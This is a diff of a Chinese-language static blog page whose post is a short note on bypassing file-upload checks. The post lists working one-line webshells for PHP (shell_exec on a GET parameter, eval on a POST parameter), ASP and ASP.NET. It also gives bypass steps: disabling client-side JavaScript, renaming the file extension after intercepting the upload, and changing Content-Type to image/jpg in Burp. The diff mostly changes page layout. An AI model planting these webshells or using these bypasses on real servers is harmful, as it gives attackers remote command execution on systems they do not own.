@@ -126,16 +126,39 @@
     <div id="content-inner">
       
       
-  <article id="page">
-    
-    
-      <h1 class="">跟着大佬学的文件上传绕过</h1>
+  <article id="post">
+    <h1>跟着大佬学的文件上传绕过</h1>
+    <p class="page-title-sub">
       
-      <p>&lt; !–more–&gt;<br>一句话木马<br>PHP：<br>    <strong>&lt;?php echo shell_exec($_GET[‘a’]);?&gt;</strong><br>    <strong>&lt;?php @eval($_POST[‘a’]); ?&gt;</strong><br>ASP:<br>    <strong>&lt;%eval request(“Cknife”)%&gt;</strong><br>　<br>ASP.NET:<br>    <strong>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“Cknife”],”unsafe”);%&gt;</strong></p>
+      
+        <span id = "post-title-updated">修改于 2018-07-07</span>
+      
+      
+      
+      <span id = "post-title-tags">
+      标签
+      
+      
+        
+        
+        <a href="/tags/web/">web</a>
+      
+      </span>
+      
+    </p>
+    
+    <p>&lt; !–more–&gt;<br>一句话木马<br>PHP：<br>    <strong>&lt;?php echo shell_exec($_GET[‘a’]);?&gt;</strong><br>    <strong>&lt;?php @eval($_POST[‘a’]); ?&gt;</strong><br>ASP:<br>    <strong>&lt;%eval request(“Cknife”)%&gt;</strong><br>　<br>ASP.NET:<br>    <strong>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“Cknife”],”unsafe”);%&gt;</strong></p>
 <p>文件上传漏洞检测<br>    1、客户端javascript检测（通常在本地检测文件的扩展名）<br>    绕过：<br>        ①禁用js<br>        ②先把文件改成符合条件的文件格式上传，再在抓包，修改文件的后缀名<br>    2、服务端检测绕过（MIME类型检测）<br>    绕过：<br>        可以通过burp拦包，将原Content-Type类型该为符合要求的image/jpg类型。</p>
 
-    
   </article>
+  <div class="random-toc-area">
+  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">显示目录</button>
+  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">隐藏目录</button>
+  <div class="random-toc">
+    <h2>目录</h2>
+    
+  </div>
+</div>
 
   
 <nav id="pagination">
